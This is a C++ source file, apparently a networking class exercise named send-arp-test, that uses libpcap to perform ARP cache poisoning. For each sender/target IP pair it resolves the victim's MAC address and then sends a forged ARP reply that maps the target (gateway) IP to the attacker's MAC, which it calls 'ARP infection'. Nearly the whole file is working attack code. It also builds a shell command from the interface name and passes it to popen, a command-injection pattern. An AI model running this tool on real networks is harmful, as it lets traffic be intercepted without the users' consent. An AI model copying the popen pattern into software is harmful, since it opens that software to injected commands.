#include <cstdio>
#include <vector>
#include <pcap.h>
#include <netinet/in.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp-test wlan0 192.168.43.93 192.168.43.1\n");
}


struct IpPair {
    Ip sender_ip;
    Ip target_ip;
};

Mac my_mac(const char* dev) {
    uint8_t mac[6];
    char cmd[256] = {0};
    snprintf(cmd, 256, "ifconfig %s | grep 'ether' | awk '{print $2}'", dev); 
    FILE *fp = popen(cmd, "r");
    fscanf(fp, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
    pclose(fp);
    return Mac(mac);
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc-2) % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    std::vector<IpPair> ip_pairs;
    for (int i = 2; i < argc; i+=2) {
        ip_pairs.push_back({Ip(argv[i]), Ip(argv[i+1])});
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "error opening device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac attacker_mac = my_mac(dev); // 내꺼 Mac 주소

    for (const IpPair& ip_pair : ip_pairs) {
        Ip sender_ip = ip_pair.sender_ip;
        Ip target_ip = ip_pair.target_ip;


        EthArpPacket arp_req_packet;
        arp_req_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        arp_req_packet.eth_.smac_ = attacker_mac;
        arp_req_packet.eth_.type_ = htons(EthHdr::Arp);

        arp_req_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        arp_req_packet.arp_.pro_ = htons(EthHdr::Ip4);
        arp_req_packet.arp_.hln_ = Mac::SIZE;
        arp_req_packet.arp_.pln_ = Ip::SIZE;
        arp_req_packet.arp_.op_ = htons(ArpHdr::Request);
        arp_req_packet.arp_.smac_ = attacker_mac;
        arp_req_packet.arp_.sip_ = htonl(target_ip);
        arp_req_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
        arp_req_packet.arp_.tip_ = htonl(sender_ip);

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_req_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            continue;
        }

        // ARP 처리
        while (true) {
            struct pcap_pkthdr* header;
            const u_char* packet_data;
            int packet_res = pcap_next_ex(handle, &header, &packet_data);
            if (packet_res == 0) continue;
            if (packet_res == -1 || packet_res == -2) {
                printf("Error: pcap_next_ex return %d(%s)\n", packet_res, pcap_geterr(handle));
                break;
            }

            EthArpPacket* arp_rep_packet = (EthArpPacket*)packet_data;

            // 패킷이 ARP reply이고 sender IP가 일치하는 경우
            if (arp_rep_packet->eth_.type_ == htons(EthHdr::Arp) &&
                arp_rep_packet->arp_.op_ == htons(ArpHdr::Reply) &&
                ntohl(arp_rep_packet->arp_.sip_) == static_cast<uint32_t>(sender_ip)){
                    

		            // ARP infection
		            EthArpPacket arp_packet;
		            arp_packet.eth_.dmac_ = arp_rep_packet->arp_.smac_; // Victim의 Mac 주소
		            arp_packet.eth_.smac_ = attacker_mac;
		            arp_packet.eth_.type_ = htons(EthHdr::Arp);

		            arp_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		            arp_packet.arp_.pro_ = htons(EthHdr::Ip4);
		            arp_packet.arp_.hln_ = Mac::SIZE;
		            arp_packet.arp_.pln_ = Ip::SIZE;
		            arp_packet.arp_.op_ = htons(ArpHdr::Reply);
		            arp_packet.arp_.smac_ = attacker_mac;
		            arp_packet.arp_.sip_ = htonl(target_ip);
		            arp_packet.arp_.tmac_ = arp_rep_packet->arp_.smac_;
		            arp_packet.arp_.tip_ = htonl(sender_ip);

		            int infect_res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_packet), sizeof(EthArpPacket));
		            if (infect_res != 0) {
		                fprintf(stderr, "ARP Infection failed: pcap_sendpacket return %d error=%s\n", infect_res, pcap_geterr(handle));
		            } else {
		                printf("ARP Infection Success: %s -> %s\n", std::string(sender_ip).c_str(), std::string(target_ip).c_str());
		            }
		            break;
            }
        }
    }

    pcap_close(handle);
}

